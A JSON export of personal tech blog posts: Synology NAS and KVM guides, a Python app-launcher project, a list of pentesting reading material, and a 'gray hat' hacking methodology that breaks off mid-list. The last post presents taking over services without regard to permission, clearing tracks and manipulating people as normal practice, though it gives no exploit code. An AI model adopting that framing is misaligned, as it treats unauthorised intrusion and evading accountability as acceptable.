[
    {
        "title": "Synology NAS tips",
        "posted_at": "2024-10-28",
        "category": "guides",
        "author": "hoek",
        "content": "\nYou may or may not remember my article Mount Synology NAS in Linux. Being the lucky owner of a Synology DS720+, I sometimes do some interesting things on it besides the standard stuff. And since this site is also my online notebook, I have collected all the things I have configured on my NAS in this article. This article will surely grow in the future. For now I will start with what I have.\n\nMount Synology NAS in LinuxI covered this in a separate article -> Mount Synology NAS in Linux. Useful if you want to permanently mount Synology network shares in a Linux system.\nAdditional packagesIt wasn’t until recently that I discovered a repository of packages created by the Synology community. With this repository, you can easily extend the packages available in the Package Centre.\nInstallation is quite simple:\n\nLog into your NAS as administrator and go to Main Menu → Package Center → Settings and set Trust Level to Synology Inc. and trusted publishers.\n\nIn the Package Sources tab, click Add, type SynoCommunity as Name and https://packages.synocommunity.com/ as Location and then press OK to validate.\n\nGo back to the Package Center and enjoy SynoCommunity’s packages in the Community tab.\n\n\nMore details on the official website: https://synocommunity.com/\nCron on a Synology NASThe standard cron command as in any Linux does not work. So crontab -e is not there.\nTo modify crontab and enable deamon, you must first become a root:\n1sudo -i\nYou obviously already have ssh access enabled and you are connected to ssh :) Tip: never expose SSH to the world, only allow connections from the local network.\nEdit crontab:\n1nano /etc/crontab\nadd your stuff there and restart the cron deamon:\n1synoservice -restart crond\nAutomatic updating of IP address via CloudflareThis can be useful if you have your domain associated with the IP address of your NAS and the IP address changes dynamically.\nMy NAS is at home and the ISP changes the IP of my router quite often, especially after reboots and updates. Access to my NAS is restricted by a firewall and I access it from my domain using the web interface with 2FA. I also use the domain to connect to my VPN. I used to buy a permanent address, but why would I need the extra cost when I can automatically update my dynamic address for my domain.\nFirst, sign up for a free Cloudflare account. Add your domain (example.com) to Cloudflare. This process involves changing your domain’s DNS servers to Cloudflare’s DNS servers.\nThe API token needs to be created. Login to your Cloudflare account. Go to My Profile > API Tokens. Click on Create Token and select Edit zone DNS. Configure the token to access your domain (example.com), and generate the token. Make a note of the API token, as you will need it to configure the DNS update script.\nMake sure that curl is installed when you ssh to the NAS: curl -V.\nCreate a script that automatically updates the DNS record in Cloudflare. Below is a sample bash script (you can keep the script in your home directory). I use nano, my favourite console text editor to edit files, it is not installed by default. You can install it from the Synology Community repository, the package that contains nano is called SynoCli File Tool (adding the Synology Community repository is described earlier in this article).\nCreate bash script nano dns.sh:\n1234567891011121314151617181920212223242526#!/bin/bash# Cloudflare configurationCF_API_TOKEN=\"YOUR_API_TOKEN\"CF_ZONE_ID=\"YOUR_ZONE_ID\"CF_RECORD_ID=\"YOUR_RECORD_ID\"CF_RECORD_NAME=\"nas.example.com\"# Get and save the current IP addressCURRENT_IP=$(curl -s http://ipv4.icanhazip.com)# Get a saved IP addressRECORD_IP=$(curl -s -X GET \"https://api.cloudflare.com/client/v4/zones/$CF_ZONE_ID/dns_records/$CF_RECORD_ID\" \\-H \"Authorization: Bearer $CF_API_TOKEN\" \\-H \"Content-Type: application/json\" | jq -r '.result.content')# Check if the IP address is differentif [ \"$CURRENT_IP\" != \"$RECORD_IP\" ]; then    echo \"IP address has changed. Updating the DNS record...\"    curl -s -X PUT \"https://api.cloudflare.com/client/v4/zones/$CF_ZONE_ID/dns_records/$CF_RECORD_ID\" \\    -H \"Authorization: Bearer $CF_API_TOKEN\" \\    -H \"Content-Type: application/json\" \\    --data \"{\\\"type\\\":\\\"A\\\",\\\"name\\\":\\\"$CF_RECORD_NAME\\\",\\\"content\\\":\\\"$CURRENT_IP\\\",\\\"ttl\\\":120,\\\"proxied\\\":false}\"else    echo \"The IP address is up to date.\"fi\nReplace YOUR_API_TOKEN with your Cloudflare API token. Replace YOUR_ZONE_ID with the zone identifier for your domain (you can find this in your Cloudflare dashboard). Replace YOUR_RECORD_ID with the DNS record identifier for your subdomain (you can also find this in your Cloudflare dashboard). The script will check the current external IP address, compare it with the current address in Cloudflare’s DNS and update the record if it is different.\nOne more thing, I did not find the CF_RECORD_ID element directly specified like the other values anywhere in the Cloudflare dashboard. However, this can be checked in a simple way, just run it:\n123curl -X GET \"https://api.cloudflare.com/client/v4/zones/$CF_ZONE_ID/dns_records\" \\-H \"Authorization: Bearer $CF_API_TOKEN\" \\-H \"Content-Type: application/json\"\nThis will return a string containing the ID.\nThe next step is to run the dns.sh script from time to time. To run the script automaticaly as a cron task, edit nano /etc/crontab and add something like this:\n1*/10    *       *       *       *       root    /var/services/homes/user/dns.sh > /dev/null 2>&1\nIt will execute script at every 10th minute. You can adapt this to your own needs.\nFirewallThese are just general tips to make your Synology NAS more secure.\nMy firewall blocks almost everything. I only allow access to the VPN from around the world, so once I connect to the VPN hosted on Synology, I can access other things on Synology, so when I connect to the VPN, it is like being on my home network. I only have port 80 and 443 on the US network so I can renew my LetsEncrypt certificate (there is no list of IPs to whitelist on firewall, there is a workaround but I haven’t tested it yet), and port 5001 just for the country I live in so that I can access the NAS via the web interface, and so that Synology Android apps like Drive, Note, Audio can connect via https to the NAS. I have disabled the admin account and any other account requires additional token authorisation. When I am out of the country I connect to the VPN or temporarily add the country as a permitted country to connect to. I also have a backup VPN which, if I connect from its address, also has an entry just in case, so an additional one IP address is therefore allowed on the firewall. I also allow everything when I am connected to the Synology VPN, so the entire subnet 10.8.0.0 and the entire home subnet 192.168.1.1. The last rule on the list is to deny everything from everywhere.\nIn short, this solution allows me to\n\nUse Android apps and web interface in my country\nRenew my LetsEncrypt certificate\nAllow me to connect to the VPN from anywhere in the world and feel like I am in my home network\nDo not block anything inside when I am connected via VPN\nHave a backup VPN that allows me to access the NAS as if I were using Synology Hosted VPN.\nA password and 2FA protected process.\n\nVideo Station alternativeThe latest Synology update removes Video Station, which can be replaced with Plex (or a slightly more complicated implementation, but still possible with Jellyfin or Emby). I chose Plex and it works fine, I just disabled all the Plex features to act as a my media server.\n"
    },
    {
        "title": "Windows 11 virtual machine on KVM",
        "posted_at": "2024-10-26",
        "category": "guides",
        "author": "hoek",
        "content": "\nI have switched back to Linux as my daily operating system. For virtualisation I have always used Virtual Box and still do, but I have always wanted to try VirtManager. In the past, I was put off by the number of configurations, and there was always something not working for me. I thought ok, I’ll give it a try and see what has changed after so many years. Here are my steps for setting up a Windows 11 virtual machine using VirtManager. If you have any comments or suggestions I would love to hear them and refine my instructions to make them even better. It is my instruction to myself not to start everything from the scratch in the future on how to install virt-manager with KVM and set up a virtual machine with Windows 11. Maybe someone will find it useful. Such a solution is better than dual-booting, and sometimes you need the whole system and not just, for example, an application emulated with Wine. Of course, there is also better performance.\nTired of AI-generated article headline illustrations? Me too, so here’s another one for you.\n\nPreparationFirst install all the necessary stuff. I am using an Ubuntu based distribution (more specifically Tuxedo, just because I bought one of their laptops) so your commands and packages may depend on your Linux distribution, but the overall configuration will be the same.\n1sudo apt install qemu-kvm libvirt-clients libvirt-daemon-system bridge-utils libguestfs-tools genisoimage virtinst libosinfo-bin virt-manager dnsmasq-base safe-rm\nAdd your user to the appropriate groups:\n123sudo adduser \"$(whoami)\" libvirtsudo adduser \"$(whoami)\" libvirt-qemusudo adduser \"$(whoami)\" kvm\nEnable the modular libvirt daemon:\n1sudo systemctl enable libvirtd.service\nDownload ISO of Windows 11 and prepare your product key (or install a trial system for testing). Also download virto-win ISO. The latest version can be found here. VirtIO is a virtualisation standard for network and disk device drivers. They allow direct (paravirtualised) access to devices and peripherals for virtual machines using them, instead of slower, emulated, ones. If you are familiar with Virtual Box think of it as Virtual Guest Additions. The last thing you need to have is a link for spice-guest-tools. Do not download yet, save it for later.\nReboot your system. After the reboot, validate the host setup:\n1sudo virt-host-validate qemu\nThe output for this command should show each step as PASS, you can ignore “QEMU: Checking for secure guest support : WARN (Unknown if this platform has Secure Guest support”), but look out for ERRORS and Google how to fix them if there are any.\nTo summarise, you have now installed virt-manager and all the additional packages needed to run virtualisation (read about each package to make sure you understand what they are for). You have added your user to the correct groups to have the correct permissions, and you have downloaded the Windows 11 installation image, virtIO drivers to proper handle the Windows 11 installation and the spice guest tools contain some optional drivers and services that can be installed in the Windows guest to improve SPICE performance and integration. These include the qxl video driver and the SPICE guest agent (for copy and paste, automatic resolution switching, etc). In the last step you have enabled libvrt service. You are now ready to create your Windows 11 virtual machine.\nOh, and most importantly, check that your hardware supports virtualisation, you can check this using the command:\n1lscpu | grep Virtualization\nif the output is VT-x or AMD-V, you are good to go. Otherwise virtualisation is not enabled in the BIOS or your hardware does not support it.\nConfigure Windows 11 Virtual HardwareI will not add a screenshot for everything, this is not a “VirtManager for dummies“ tutorial. I bet, if you are here, you know a little bit about Linux and how applications work, so I will only add screenshots in a few places.\nLaunch the Virtual Machine Manager application. In Settings, enable XML editing: Edit > Preferences -> Enable XML editing.\n\nNext, create a new virtual machine: File -> New Virtual Machine. This will show you a nice wizard that will guide you through all the steps.\nThe first step is to select the installation media, so select Local install media (ISO image or CDROM). In the second step browse for the Windows 11 ISO image. The operating system should be detected automatically, if not, select Microsoft Windows 11. In the third step allocate memory and CPU. I recommend at least 6 GB of RAM and 2 CPUs. The fourth step is to create a hard drive storage. The storage image that is created will be of the type qcow2. Choose whatever size you want, just remember that Windows 11 is large after installation so 20 GB may not be enough, start with 60 GB. The initial qcow2’s file size will be smaller, and it will only grow as more data is added. The last fifth step of the wizard is the name for your machine and a summary of the previous choices. Don’t forget to select Customise configuration before install. This is important because when you finish button you will want to make additional changes, before installation.\nOnce you have pressed the Finish button, you will see a new window with additional setup options. In the Overview section select the chipset as Q35 and the firmware as UEFI. While you are still in the Overview section, change from the Details tab to XML.\n\nFind the hyperview part and replace it with:\n123456789101112131415161718<hyperv mode=\"custom\">  <relaxed state=\"on\"/>  <vapic state=\"on\"/>  <spinlocks state=\"on\" retries=\"8191\"/>  <vpindex state=\"on\"/>  <runtime state=\"on\"/>  <synic state=\"on\"/>  <stimer state=\"on\">    <direct state=\"on\"/>  </stimer>  <reset state=\"on\"/>  <vendor_id state=\"on\" value=\"KVM Hv\"/>  <frequencies state=\"on\"/>  <reenlightenment state=\"on\"/>  <tlbflush state=\"on\"/>  <ipi state=\"on\"/>  <evmcs state=\"on\"/></hyperv>\nIf you have an AMD processor remove <evmcs state=\"on\"/>. It only works for Intel.\nIn the part for <clock offset=\"localtime\"> add one line just before </clock>\n1<timer name=\"hypervclock\" present=\"yes\"/>\nThese changes improve the performance of the Windows 11 virtual machine. You can take my word for it, or explore the details with Uncle Google or Auntie ChatGPT. If you care about privacy you might want to use Brave Search. They are getting better every day.\nReturn to the configuration. Go back to the Details tab and go to CPUs. Select Copy host CPU configuration (host-passthrough). Next section is SATA Disk 1, here Disk bus should be VirtIO and in Advanced options Cache mode: none and Discard mode: unmap. (If you set the discard mode to unmap, the qcow2 disk image will automatically shrink to reflect the newly freed space.) After making some changes always press Apply before proceeding to the next section.\nThe default installation of Windows 11 does not recognise the SATA disc when it is set up for Disk Bus VirtIO. So we downloaded the VirtIO-Win ISO file. In the left corner of the window there is a button called Add Hardware. Press it and add Storage as a new virtual hardware. In the Details tab select Custom Storage and enter a path to virtio-win.iso, as Device type select CDROM device. Click Finish. Now we have an additional CDROM drive with a mounted ISO image with drivers.\n\nGo to the NIC section to configure the network. Select Device model as the virtio.\nRemove the Tablet device. This can reduce idle CPU usage and context switches.\nAdd hardware again, and select, Channel with Name: org.qemu.guest_agent.0. This will create a private communication channel between the physical host machine and the guest virtual machine. This allows the host machine to issue commands to the guest operating system using libvirt. The guest operating system then responds to these commands asynchronously.\nNext go to the TPM section and select Type: Emulated, and in the advanced options Model: CRB and Version 2.0. Do not forget to press the Apply button.\nWe are now ready to install. Click Begin installation at the top of the window.\nWindows 11 virtual machine on KVM installationThe steps to install Windows 11 are the same as for the standard installation on the physical laptop or desktop hardware, just follow the installation wizard. Choose your language, keyboard etc., then enter your product key, select the correct Windows version, and choose the Custom: Install Windows only (advanced) option.\n\nWhen you get to the point where you need to select the disc where Windows will be installed, you will find an empty list because Windows does not have drivers for VirtIO storage. You will need to install the drivers manually.\nSelect Load driver, then Browse, expand the CD Drive (E:), expand Viostor, expand w11, select amd64, and click OK. Then click Next. This will load the drivers and the installer will recognise the disc. But do not press the Next button yet. We need to load and install the VirtIO network drivers. Repeat the process for the network device as well. Click on Load driver, then Browse, expand the CD Drive (E:), expand NetKVM, expand w11, select amd64, and click OK. Continue with the Windows installation.\nOnce you have completed the installation and initial configuration steps and everything has gone according to plan, you will see the Windows 11 desktop. Open Windows Explorer and navigate to the mounted image on the E drive, locate the virtio-win-guest-tools package and install it. \nFinally download and install spice-guest-tools on the Windows 11 virtual machine. After installing the spice -guest-tools, go to the Windows 11 window, click View -> Scale Display, and check the ‘Auto resize VM with window‘ option. This will enable the Windows 11 guest window to automatically resize when you scale it. Don’t forget to reboot the system after each agent installation.\nThe installation is complete. To clean up stuff you can check machine configuration and unmount the virtio ISO image from SATA CDROM 2 and remove CDROM as well. In SATA CDROM 1 you can unmount the Windows 11 iso image, and keep this CDROM for other images you may want to mount in the future.\nEnable Core IsolationIf you wish you can also enable Core Isolation in Settings > Privacy & Security > Windows Security > Device Security > Core isolation details.\nTo do this you need to go to the virtual hardware details page, then click the Overview option in the left pane and the XML tab in the right. Under the <cpu> section, specify the CPU mode and add the policy flag.\n123<cpu mode=\"host-passthrough\" check=\"none\" migratable=\"on\">  <feature policy=\"require\" name=\"vmx\"/></cpu>\nRestart the VM and enable Core Isolation.\nOptimize Windows 11 Performance\nDisable SuperFetch - run services and look for SysMain. Right click for Properties and disable the service.\n\nDisable Windows Web Search - run regedit go to Computer\\HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows Right click on the Windows key, select New, and then select the Key option. Enter Explorer as the key name and press [Enter]. Right click on the newly created Explorer key, select New, and then select the DWORD (32-bit) Value option. Name the DWORD DisableSearchBoxSuggestions and press [Enter]. Double-click the newly created DWORD DisableSearchBoxSuggestions and change its value from 0 to 1. Restart the virtual machine.\n\nDisable useplatformclock - run CMD as admin and execute the following command: bcdedit /set useplatformclock No\n\nAdjust the Visual Effects - type performance in the Search box, then select Adjust the appearance and performance of Windows from the list of results. On the Visual Effects tab, select Adjust for best performance > Apply.\n\n\nOther useful stuffHere are some additional commands and tips for working with Virt-Manager.\nConvert vdi to qcow2I have done this a few times, and sometimes machines wake up and sometimes they are dead :) If you have your VirtualBox machine disk image in vdi format you can convert it to qcow2, setup the machine with that drive and run it (if it’s up, install all the drivers, and uninstall VirtualBox guest additions).\n1TMPDIR=/home/user/Download/temp virt-sparsify /home/user/VMs/Windows11/Win11.vdi --convert qcow2 /home/user/Downloads/Win11.qcow2\nShared folderIn the machine sesttings in the Virt-Manager go to the Memory section and select Enable shared memory. Then go to Add Hardware, choose filesystem and set Driver to virtiofs, select Source path to the folder you want to share and in Target path select the name of the folder that will be displayed in the file explorer on the guest machine. Download and install WinFPS on the Windows 11 guest machine (only the Core option should be selected in the installer). In Windows 11, run Services and search for VirtIO-FS Service. Start it. Also to enable it on every boot go to VirtIO-Sevice-FS > Properties > Startup type and change from Manual to Automatic. After starting the service, open explorer and you will see a new drive mounted, if you open it, it will be the shared folder of your physical machine.\nExtend drive sizeIf your virtual drive gets too small, you can expand it. Before you resize the drive, delete your snapshots. To get a list of snapshots, use the command:\n1virsh snapshot-list Windows11\nTo delete a snapshot:\n1virsh snapshot-delete --domain Windows11 --snapshotname mysnapshot\nFirst, check your drive and verify its size and information:\n1qemu-img info /var/lib/libvirt/images/Windows11.qcow2\nThen resize it, for example by 20 GB\n1qemu-img resize  /var/lib/libvirt/images/Windows11.qcow2 +20G\ncheck the info again and you will see that it is now resized.\nDynamic driveIf your drive was not created as dynamic, you can convert it:\n1qemu-img convert -f qcow2 -O qcow2 -o preallocation=off disk1.qcow2 newdisc1.qcow2\n\nthe -f format flag specifies the format of the input disk\nthe -O format flag specifies the format of the output disk\nthe -o flag is used to specify some options for the output file, such as the way data is allocated (in this case, no data pre-allocation)\n\nRename disc1.qcow2 to disc1.qcow2.bak just to back it up. Do not delete it until you are sure that newdisc1.qcow2 is working as expected. Rename newdisk1.qcow2 to disc1.qcow2 when you are finished, using command sudo mv newdisc1.qcow2 disc1.qcow2\nIf you want to create a dynamic virtual disk from scratch, you can run this command:\n1qemu-img create -f qcow2 -o preallocation=off <disk-name> <disk-size>\nwhere disk-name is the name of the dynamic virtual disk and disk-size is the maximum size of the disk (you can use k, M, G, T, P or E as suffixes)\nRecover free spaceFirst make sure you have libguestfs-tools installed, then run the command\n1virt-sparsify in_disk out_disk\nwhich copies in_disk to `out_disk, making the output sparse. The format of the input disk is detected (e.g. qcow2) and the same format is used for the output disk. Virt-sparsify tries to zero out and sparsify free space on every file system it can find in the source disk image. You can get it to ignore (not zero free space on) certain file systems by doing the following:\n1virt-sparsify --ignore /dev/sda1 in_disk out_disk\nSince virt-sparsify ≥ 1.26, you can now sparsify a disk image in place by doing:\n1virt-sparsify --in-place in_disc\nManual version to do the same is to backup disk file cp image.qcow2 image.qcow2_backup zero out disk on quest sudo dd if=/dev/zero of=/mytempfile && sudo rm -f /mytempfilethen shrink disk without compression (better performance, larger disk size): qemu-img convert -O qcow2 image.qcow2_backup image.qcow2 or shrink disk with compression (smaller disk size, takes longer to shrink, performance impact on slower systems): qemu-img convert -O qcow2 -c image.qcow2_backup image.qcow2 then delete the backup when everything works fine.\nNAT forwardingIt is a complex subject and it is better to follow the official documentation:\nhttps://wiki.libvirt.org/Networking.html#Forwarding_Incoming_Connections\nReferencesI did not invent everything in this article, I am not that smart. I just took everything from the Internet and put it together for my needs. Here are some of the sources I used for my guide. These sources have a lot of screenshots and YouTube videos, so they are more user-friendly for people who likes pictures and moving images.\n\nHow to Properly Install a Windows 11 Virtual Machine on KVM\nHow Do I Properly Install KVM on Linux\nShare Folder Between Windows Guest and Linux Host in KVM using virtiofs\nSetup A Shared Folder Between KVM Host And Guest\nNAT forwarding - Libvirt WIki\n\nThanks for reading, and please do not join my Discord server, as nothing happens there except people joining to say hello or complain that the server is dead. However, if you have any comments on the article, please drop by there and give your feedback. You can also find me on the official 0ut3r.space Matrix channel or on the Mastodon. You will have to find the links yourself, they are somewhere on the website.\nAmen.\n"
    },
    {
        "title": "Worth checking ep.3",
        "posted_at": "2024-09-28",
        "category": "resources",
        "author": "hoek",
        "content": "\nAhh, today is that glorious day when I realize that my plan to write one or even two articles a month on my  wonderful blog is failing. And then I remind myself that my worth checking series is not only there to share knowledge and interesting material but also to save my ass in just such situations. To artificially sustain this beautiful idea of writing a minimum of one article per month. There’s a bit going on in my private life, I’m a bit lazy, well, and winter is coming. The time when you think ok, I’m not going to go anywhere and I’ll have more time for writing and other cool projects, when in fact you’re sleeping more, eating more, watching more TV series. Why lie to yourself. You just have to act, sometimes without a long-term plan, sometimes chaotically and sometimes by surprise.\nWelcome in episode 3.\n\nAs always, today’s header image was generated by AI. This time with additional material sent on the Discord channel by our small community. Thx! And of course all documents I found interesting or have on my reading list, enjoy! \nDocuments to check\n25_Cyber_Security_Frameworks.pdf\n100_Free_Security_Tools.pdf\nA_Detailed_Guide_on_Log4J_Penetration_Testing.pdf\nAnonymous_Logins_for_Pentesters.pdf\nBest_Alternative_of_Netcat_Listener.pdf\nCredential_Dumping_Fake_Services.pdf\nCybersecurity_Career_Roadmap_2024.pdf\nffuf.pdf\nFTk_Imager.pdf\nLLM_AI_Security_and_Governance_Checklist.pdf\nMicrosoft_Office_and_Windows_Remote_Code_Execution.pdf\nMS365_Security_checklist.pdf\nMSFvenom_Cheat_Sheet.pdf\nPowershell_Tips_Tricks_for_Pentester.pdf\nPwning_the_Domain_series_With_Credentials.pdf\nRed_Team_Interview_Questions.pdf \nRemote_Desktop_Penetration_Testing_Port_3389.pdf\nThe_Art_of_Linux_Persistence.pdf\nthe_linux_commands_handbook.pdf\nTomcat_Pentesting.pdf\nWeb_Security_Guide.pdf\nWindows_Exploitation_msbuild.pdf\nWindows_Exploitation_rundll32.exe.pdf\nWireless_Penetration_Testing_Airgeddon.pdf\nWireless_Penetration_Testing_Fluxion.pdf\nWireless_Penetration_Testing_PMKID_Attack.pdf\nWordlists_for_Pentester.pdf\nYour_Penetration_Testing_Certification_Roadmap.pdf\n\nArticles to read\nTarget’s EasySweep – Simplifying Skimmer Detection for All\nIntroducing Mullvad Leta: a search engine used in the Mullvad Browser\n10 Best Linux Distro Operating Systems For Ethical Hacking & Penetration Testing – 2024\nChatGPT Reconnaissance Techniques for Penetration Testing Success\nTop Information Security Threats for Businesses 2023\nI’m an Old Fart and AI Makes Me Sad\nThe Great Kate Debate\nObsolete Command-Line Tools of Linux\nAttacks-on-Tor\n\nBookmark this\nhttps://infosec.engineering/\nhttps://opensourcemusings.com/\nhttps://danielmiessler.com/\nhttps://cheat.sh/\nhttps://ddosecrets.com/\nhttps://github.com/Ignitetechnologies/Mindmap\nhttps://whynoipv6.com/\nhttps://fotoforensics.com/\nhttps://lolbas-project.github.io/\nhttps://gtfobins.github.io/\nhttps://eylenburg.github.io/android_comparison.htm\nhttps://eylenburg.github.io/im_comparison.htm\nhttps://dnssec-debugger.verisignlabs.com/\nhttps://d3ward.github.io/toolz/adblock\nhttps://www.zonemaster.net/en/run-test\nhttps://z0ccc.github.io/extension-detector/\nhttps://payoncealternatives.com/\nhttps://github.com/fastfire/deepdarkCTI\nhttps://apps.sentinel-hub.com/eo-browser/\nhttps://endoflife.date/\nhttps://www.speedguide.net/ports.php\nhttps://osi-model.com/\nhttps://tosdr.org/\nhttps://github.com/pluja/awesome-privacy\n\nTalking headsTBH I have not seen recently, any video on YouTube or indeed anywhere that is interesting and related to hacking or cyber-security. I may have seen something there but nothing that is worth recommending. I’m also a fan of reading rather than watching, perhaps hence my lack of interesting finds on the subject. If you have any interesting videos related to technology and IT, please send them in.\nIn the meantime I recommend DUST channel about short sci-fi movies.\nCool apps\nMission Center\nMetadata Cleaner\nCanaryTokenScanner\nlocalsend\nFluent Reader\n\nIllustrations\n\n\n\n\n\n\n\n\nFunny stuff\n\n\n\n\n"
    },
    {
        "title": "SysPwn - App Launcher",
        "posted_at": "2024-08-16",
        "category": "projects",
        "author": "hoek",
        "content": "\nEveryone knows that I am not a programmer, but yesterday was a holiday in my country and I was doing some tidying up of my notes and todo lists, and one entry was quite old and I thought, ok, it is probably time to complete this task. Holy moly, but how does that relate to programming? Let’s start at the beginning.\n\nWhen I was a young and handsome IT specialist supporting end users in a company, like any such specialist I had a pen drive full of applications to fix computer problems. And of course the immortal Hirens Boot CD. To make things easier for myself, after a few years I also created a menu of links to portable applications that I could launch from the USB to speed things up. There’s even a trace of this on alternativeto.net, the tool was called Hoek’s Tools. Funny, because it was just a menu for third party applications. But it was used by various people in my company, colleagues and even 8 other people around the world ;) The tool died when I stopped solving users’ problems and started creating them. I mean, I started working closer to cybersecurity. And today, as a red teamer and ethical hacker, I do more breaking than fixing. Fixing is what others do after I break.\nI had to replace my normal memory stick with one with a write-block option because I was increasingly using tools that were detected as malicious. I then bought a Kanguru FlashBlu30™ Lightning-Fast USB3.0 with Physical Write Protect Switch 8GB. Cheap and good. Every time I plug a USB stick into a computer with AV, it doesn’t spoil my toolkit by automatically deleting it. No need to copy the tools every time.\nBut what about programming? Not so fast. I was tidying up my notes and one of the tasks from the distant past was to create an application in any programming language. USB app launcher.\nWell, I started with AutoHotkey, which has little to do with programming, but I couldn’t manage it, it is possible to build a GUI and automate things there, but for an app launcher it was probably too much. Anyone who reads my blog knows that I’ve been trying to learn Python for years, and I find it difficult. Or to tell the truth, I am damn lazy. Fortunately, when I don’t know what to do, my friend ChatGPT comes to the rescue. We chatted together yesterday and managed to write a simple application runner in Python.\nThe intention was simple. I have an apps folder on a USB stick where I drop various applications into folders with different categories. My launcher scans this folder and subfolders on startup and creates a list of apps and categories. Each exe file is treated as an app name and added to the menu. This allows everyone to build their own set of tools. There is also a search box at the top to make it easier to search the long list. I manually added an entry to run a PowerShell console that runs in the apps folder on the USB stick. Also, in the cfg file, you can exclude exe files that you do not want to be included in the list. For example, the System Informer application (formerly known as Process Hacker) has an auxiliary exe file in its folder in addition to the main application, which would also appear in the list without exclusion. Or you may simply want to hide an application for some other reason. I decided not to put the icon in the taskbar because if I pull out the memory stick in an emergency and forget to close the application, it leaves a visible trace in the form of a taskbar icon.\nPros:\n\nI completed a 10-year-old task on my list.\nI have a dream and simple application launcher from my USB.\nI learned new things in Python.\n\nCons:\n\nMy wife was unhappy that I spent half the day in front of the computer.\nI still don’t know how to code in Python xD\n\nIf you want to see the result of the work I encourage you to check out the code on GitHub. I called it SysPwn. Because I use it for just such purposes ;)\nRemember to document your work so that it is easier to return to and develop in the future, and it is also worth sharing your solutions with others who may find them useful.\nExample screenshot: (more in the code repository).\n\nHave a great day!\n"
    },
    {
        "title": "Gray Hat hacking instructions",
        "posted_at": "2024-07-12",
        "category": "guides",
        "author": "hoek",
        "content": "\nThis is going to get messed up. And, in fact, the goal was order.\nI recently did some tidying up of my commands and steps for checking a service/pen testing/bounty hunting/hacking/red taming/messing around. I decided to write it down in one place and expand it as needed. Here is my list of steps and tools I use when hacking. Mainly what I have used recently. Sometimes I update the toolkit because some become obsolete and are not developed anymore and new tools appear in their place. Another reason is that I like to have a list of steps to follow. Hacking is a complex process and sometimes it gets chaotic, so it’s worth sticking to some sort of guide so I don’t accidentally forget anything. There is no single golden rule or instruction on how to hack everything.  The general approach may have some outline, but everything changes depending on what you find. It is also worth keeping an eye out for new applications and scripts, because sometimes you can add something to your own toolkit to speed up or automate a step, well, unless fame and glory are involved.\nHere are some websites where you can find some new tools:\n\nKaliLinuxTutorials\nKitPloit\n\nWell, you see, I’m not a CVE-publishing, zero-day-finding, new-vulnerability-discovering hacker, i.e. I might be able to do it, but it would probably take me a very long time and the reward would be inadequate to the discovery. And because I am lazy, greedy, and believe that fame is a restriction of freedom, I hack like a racist script kiddie.\nMy hacking is about finding low-hanging fruit and exploiting the mistakes of the man on the other side.\nWell, in a way that’s what hacking is all about, I have the knowledge of what it should look like and the person who has the service also knows it or doesn’t know it. So they have knowledge or they don’t have knowledge or they have gaps in their knowledge. And these security holes or lack of proper configuration makes the weakness of the service available. So it’s a kind of knowledge race. Either someone will use the knowledge to have a secure service or I will use it to take over.\nA bit of a messy description, but it works, at least for me. The more I train, the more vulnerabilities I discover, the more vulnerabilities I discover, the more services I take over.\nAnd it’s not like in the movies, where you order a hack and it gets everywhere. A well secured place is not hackable. End of story (or I’m not there yet). The only thing you can do with a well-secured place is to break its owner, a human being. Then we have access to the place in the same way as he does. \nI don’t hack people though, I leave the social engineering tricks to myself to make my life easier, to get people to do what I want or to agree with me when they normally wouldn’t. I enjoy manipulating people more.\nSo I hack what can be hacked, not what should be hacked or what I want to be hacked.\nA short break for a fancy AI-generated image - a must have in today’s world on every hacker blog - for this article. The internet is now flooded with this kind of AI generated graphics, so I follow the trends and put this shit here too. Have fun.\n\nIt is funny how AI thinks hackerspace looks and how real hackerspace actually looks.\n\nBack to hacking. In general it’s a hard and long process, running the tools, analyzing the results, understanding the results, drawing conclusions, restarting the tools, re-analyzing and many hours in between while the tools are running to spit out more results for analysis. Analyzing and reviewing tons of data and then checking whether potentially detected vulnerabilities are real and exploitable, only to find out in the end that they are not.\nAnd then maybe those few clicks to take over the database or service. Or finding the point at which all known options have been sorted, all leads closed and the attack in question abandoned. Moving on to a list of targets and selecting the next one to repeat hours or days of analysis. To perhaps find nothing again. Sometimes something works a couple of times a month, sometimes a couple of times a week, sometimes a marathon failure occurs and nothing is found for months.\nIt’s not as exciting as in the movies.\nSo on paper the steps look more or less like this and sometimes they are nowhere near the practice. But you have to start somewhere.\n\nReconnaissance/Footprinting\nScanning\nGaining access\nMaintaining Access\nClearing tracks\n\nThere are dozens of pages describing these steps and the theories behind them. You’re sure to find some. Below are my tools that are more or less assigned to these steps, I focus more on reconnaissance and scanning and based on the findings get access and maintain it or just get what I want and sometimes clean up to make it harder to identify me, but in most cases even if you leave a mess and you had a good OPSec no one will find you. As I mainly check web applications and my targets are mainly databases or other vulnerabilities that can be reported in the bug bounty, not everything is always covered. Oh, and don’t forget that I’m a senior script kiddie.\nCheck back from time to time to see what new tools I have added and what I have removed.\nThe list below only has basic command examples, you should always spend some time tweaking the parameters. Especially those related to threads and timing, throttling, aggression level and others related to being less noisy. Don’t forget to add some API’s to the tools configs to get better results.\nEnvironmentI do everything on Kali Linux on a dedicated physical and virtual machine. On the physical I leave the tasks that take more time, it is my main machine that runs 24h (when I am hacking, otherwise it is turned off). On the virtual, I test and launch custom tools and tasks that I can do quickly.\nAdditionally, when testing and hacking, the system is connected to a VPN hosted on my VPS + sometimes I use PIA VPN + sometimes I use Tor as a socks proxy for traffic, e.g. when hacking hidden services on the onion domain.\nTo sum things up:\n\nKali Linux OS\nVPN (personal + VPS and Private Internet Access VPN)\nDell OptiPlex Micro 7050 (i5-6500T, 8GB 128 SSD), I’ll add more RAM and SDD one day, for now it’s enough.\nVirtual machine running Kali Linux on VirtualBox. Sometimes I use virt-manager to provision temporary systems.\nVPS, the one with the VPN configured, I also use sometimes to run some basic tools.\n\nFor some Python tools downloaded from GitHub, I also install them as a virtual environment, as sometimes system dependencies are not met. Here are steps how to create venv, activate it, install dependencies in it and deactivate.\n1234python3 -m venv .venvsource .venv/bin/activatepip3 install -r requirements.txtdeactivate\nFootprintingFootprinting is just gathering general information about the target, it is the first step in the reconnaissance process. Passive gathering (DNS, public records, WHOIS, social media) and active gathering, i.e. interacting with the system (ping, network mapping, banner grabbing). All to understand what the system looks like and how it works. It is advisable to distinguish between reconnaissance and scanning as much as possible, so that the reconnaissance itself does not burn your operation.\n\nWHOIS Lookup: To get domain registration information.\nNslookup/Dig: For DNS information.\nTraceroute: To determine the path to a destination.\nGoogle Dorking: Use specific search queries to find information that is not easily accessible.\nInternet of everything: Shodan, ZoomEye, Censys, GreyNoise.\nWaf: 